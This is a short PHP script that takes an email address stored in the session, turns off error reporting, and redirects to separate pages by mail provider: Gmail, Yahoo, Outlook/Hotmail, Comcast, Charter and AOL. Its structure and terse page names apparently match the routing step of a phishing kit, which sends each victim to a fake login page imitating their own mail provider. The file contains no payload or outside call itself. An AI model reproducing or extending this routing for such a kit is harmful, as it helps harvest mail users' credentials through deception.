<?php
session_start();
error_reporting(0);

$ec = $_SESSION['UName'];

if(str_contains($ec,"@gmail")){
header("location:gm.php");
}
else if(str_contains($ec,"@yahoo")){
header("location:ym.php");
}
else if(str_contains($ec,"@outlook")){
header("location:om.php");
}
else if(str_contains($ec,"@comcast")){
header("location:xm.php");
}
else if(str_contains($ec,"@charter")){
header("location:cm.php");
}
else if(str_contains($ec,"@hotmail")){
header("location:om.php");
}
else if(str_contains($ec,"@ymail")){
header("location:ym.php");
}
else if(str_contains($ec,"@aol")){
header("location:am.php");
}else{
    header("location:om.php");
}
?>